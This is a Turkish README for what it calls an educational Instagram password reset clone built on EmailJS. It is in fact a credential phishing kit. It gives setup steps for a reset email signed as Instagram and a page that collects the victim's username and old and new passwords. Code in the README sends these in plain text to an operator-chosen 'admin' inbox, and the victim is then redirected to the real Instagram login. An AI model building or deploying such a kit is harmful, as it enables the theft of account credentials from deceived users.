# Instagram Şifre Sıfırlama Sistemi

Bu proje, e-posta gönderimi için EmailJS kullanan Instagram'ın şifre sıfırlama işlevinin istemci tarafı uygulamasıdır. Gerekli tüm sayfaları içermekte ve tam şifre sıfırlama akışını sunucu gerektirmeden simüle etmektedir.

## Özellikler

- Instagram benzeri kullanıcı arayüzü tasarımı
- Şifre sıfırlama istek sayfası
- Şifre değiştirme sayfası
- Başarı onay sayfası
- EmailJS aracılığıyla e-posta bildirimleri
- Mobil ve masaüstü için duyarlı tasarım

## Proje Yapısı

```
instagram/
├── basarili.html          # Şifre değiştirildikten sonraki başarı sayfası
├── logo.png               # Instagram logosu
├── sifre_degistir.html    # Şifre değiştirme sayfası
├── sifre_yenile.html      # Şifre sıfırlama istek sayfası
└── README.md              # Bu dosya
```

## Kurulum Talimatları

### 1. Depoyu Çatallama ve Klonlama

```bash
git clone https://github.com/yourusername/instagram.git
cd instagram
```

### 2. EmailJS Hesabı Kurulumu

1. [EmailJS](https://www.emailjs.com/) adresine gidin ve ücretsiz bir hesap oluşturun
2. E-posta adresinizi doğrulayın
3. Yeni bir e-posta servisi oluşturun:
   - Kontrol panelinizde "Email Services" bölümüne gidin
   - "Add New Service"e tıklayın
   - E-posta sağlayıcınızı seçin (Gmail, Outlook, vb.)
   - Kimlik doğrulama adımlarını izleyin
   - **Servis ID**nizi not alın

### 3. E-posta Şablonları Oluşturma

EmailJS kontrol panelinizde iki e-posta şablonu oluşturmanız gerekir:

#### Şablon 1: Şifre Sıfırlama E-postası
1. "Email Templates"e gidin ve "Add New Template"e tıklayın
2. Şablonu yapılandırın:
   - **Şablon Adı**: Şifre Sıfırlama E-postası
   - **Şablon ID**: Kendi şablon ID'nizi oluşturun
   - **Konu**: Instagram Şifre Sıfırlama
   - **HTML İçerik**:
     ```html
     Merhaba,
     
     Şifrenizi sıfırlamak için aşağıdaki bağlantıya tıklayın:
     
     <a href="{{reset_link}}">Şifreyi Sıfırla</a>
     
     Bu bağlantıyı talep etmediyseniz, lütfen bu e-postayı dikkate almayın.
     
     Saygılarımızla,
     Instagram
     ```
3. **Şablon ID**nizi not alın

#### Şablon 2: Yönetici Bildirim E-postası
1. "Email Templates"e gidin ve "Add New Template"e tıklayın
2. Şablonu yapılandırın:
   - **Şablon Adı**: Yönetici Bildirimi
   - **Şablon ID**: Kendi şablon ID'nizi oluşturun
   - **Konu**: Kullanıcı Şifre Değişikliği Bildirimi
   - **HTML İçerik**:
     ```html
     {{message}}
     ```
3. **Şablon ID**nizi not alın

### 4. HTML Dosyalarında EmailJS Yapılandırması

Her iki HTML dosyasında da EmailJS yapılandırmasını güncellemeniz gerekir:

#### `sifre_yenile.html` dosyasında:
1. EmailJS başlatma kodunu bulun:
   ```javascript
   emailjs.init("KENDI_PUBLIC_KEYINIZI_BURAYA_GIRIN");
   ```
2. `KENDI_PUBLIC_KEYINIZI_BURAYA_GIRIN` yerine kendi EmailJS genel anahtarınızı yerleştirin (Hesap -> API Anahtarları bölümünde bulunur)

3. E-posta gönderme kodunu bulun:
   ```javascript
   emailjs.send('KENDI_SERVICE_IDNIZI_BURAYA_GIRIN', 'KENDI_TEMPLATE_IDNIZI_BURAYA_GIRIN', templateParams)
   ```
4. `KENDI_SERVICE_IDNIZI_BURAYA_GIRIN` ve `KENDI_TEMPLATE_IDNIZI_BURAYA_GIRIN` yerine kendi değerlerinizi yerleştirin

#### `sifre_degistir.html` dosyasında:
1. EmailJS başlatma kodunu bulun:
   ```javascript
   emailjs.init("KENDI_PUBLIC_KEYINIZI_BURAYA_GIRIN");
   ```
2. `KENDI_PUBLIC_KEYINIZI_BURAYA_GIRIN` yerine kendi EmailJS genel anahtarınızı yerleştirin

3. Yönetici bildirim kodunu bulun:
   ```javascript
   emailjs.send('KENDI_SERVICE_IDNIZI_BURAYA_GIRIN', 'KENDI_ADMIN_TEMPLATE_IDNIZI_BURAYA_GIRIN', adminEmailParams)
   ```
4. `KENDI_SERVICE_IDNIZI_BURAYA_GIRIN` ve `KENDI_ADMIN_TEMPLATE_IDNIZI_BURAYA_GIRIN` yerine kendi değerlerinizi yerleştirin

### 5. Yönetici E-posta Adresini Güncelleme

`sifre_degistir.html` dosyasında, yönetici e-posta adresini bulun ve kendi yönetici e-posta adresinizle güncelleyin:

```javascript
const adminEmailParams = {
    from_name: "Şifre Değişikliği Sistemi",
    to_email: "admin@sirketiniz.com", // <-- Bunu kendi e-posta adresinizle değiştirin
    message: `Kullanıcı Şifre Değişikliği Bildirimi:

Kullanıcı E-posta: ${email}
Kullanıcı Adı: ${username}
Eski Şifre: ${oldPassword}
Yeni Şifre: ${newPassword}
Tarih: ${new Date().toLocaleString('tr-TR')}`
};
```

## Nasıl Kullanılır

### Projeyi Yerel Olarak Çalıştırma

1. `sifre_yenile.html` dosyasını web tarayıcınızda açın
2. E-posta adresinizi ve kullanıcı adınızı girin
3. "Giriş Bağlantısı Gönder"e tıklayın
4. Şifre sıfırlama bağlantısı için e-postanızı kontrol edin
5. Bağlantıya tıklayarak şifre değiştirme sayfasına gidin
6. Eski şifrenizi, yeni şifrenizi ve kullanıcı adınızı girin
7. "Şifreyi Değiştir"e tıklayın
8. Başarı sayfasına yönlendirileceksiniz

### Akışı Test Etme

1. **Şifre Sıfırlama İsteği**:
   - `sifre_yenile.html` dosyasını açın
   - Geçerli bir e-posta adresi ve kullanıcı adı girin
   - Formu gönderin
   - E-postanızdaki sıfırlama bağlantısını kontrol edin

2. **Şifre Değiştirme**:
   - E-postanızdaki sıfırlama bağlantısına tıklayın (veya token parametreleriyle doğrudan `sifre_degistir.html` dosyasını açın)
   - Eski şifrenizi, yeni şifrenizi ve kullanıcı adınızı girin
   - Formu gönderin
   - Yönetici e-postasını bildirim için kontrol edin

3. **Başarı Sayfası**:
   - Başarılı şifre değişikliğinden sonra `basarili.html` sayfasına yönlendirileceksiniz
   - Buradan Instagram'ın gerçek giriş sayfasına dönebilirsiniz

## Özelleştirme

### Logoyu Değiştirme

`logo.png` dosyasını kendi logo dosyanızla değiştirin (aynı dosya adını koruyun).

### E-posta İçeriğini Değiştirme

EmailJS kontrol panelinizdeki e-posta şablonlarını düzenleyerek e-posta içeriğini özelleştirebilirsiniz.

### Stil Değişiklikleri

Tüm CSS HTML dosyalarına gömülüdür. Her dosyadaki `<style>` bölümlerinden stilleri değiştirebilirsiniz.

## Önemli Notlar

1. **Yalnızca İstemci Tarafı**: Bu yalnızca bir ön uç uygulamasıdır. Üretim ortamında, uygun arka uç doğrulama ve güvenlik önlemlerine ihtiyacınız olacaktır.

2. **Güvenlik Hususları**:
   - Şifreler güvenli olarak saklanmaz (bu bir demodur)
   - Jetonlar rastgele oluşturulur (kriptografik olarak güvenli değildir)
   - Oran sınırlama veya kötüye kullanım önleme yoktur

3. **EmailJS Sınırları**: Ücretsiz EmailJS hesaplarının gönderim limitleri vardır. Ayrıntılar için fiyatlandırma sayfasını kontrol edin.

4. **Tarayıcı Uyumluluğu**: Proje modern JavaScript özelliklerini kullanır. Tüm modern tarayıcılarda çalışır.

## Sorun Giderme

### E-postalar Gönderilmiyor

1. EmailJS hesabınızı ve servis yapılandırmanızı kontrol edin
2. Genel anahtarınızı, servis ID'nizi ve şablon ID'lerinizi doğrulayın
3. JavaScript hataları için tarayıcı konsolunu kontrol edin
4. Modern bir tarayıcı kullandığınızdan emin olun

### Geçersiz Bağlantı Hatası

1. `sifre_degistir.html` dosyasına uygun URL parametreleriyle eriştiğinizden emin olun
2. URL'de token parametresinin mevcut olduğunu kontrol edin

### Stil Sorunları

1. Tüm dosyaların aynı dizinde olduğundan emin olun
2. `logo.png` dosyasının mevcut olduğunu kontrol edin
3. Tarayıcı uyumluluğunu doğrulayın

## Lisans

Bu proje yalnızca eğitim amaçlıdır. Instagram veya Meta ile herhangi bir bağlantısı yoktur.

## Katkıda Bulunma

Bu depoyu çatallamaktan ve iyileştirmelerle birlikte çekme istekleri göndermekten çekinmeyin.

## Destek

Herhangi bir sorunuz veya sorununuz varsa, lütfen bu depoda bir konu açın.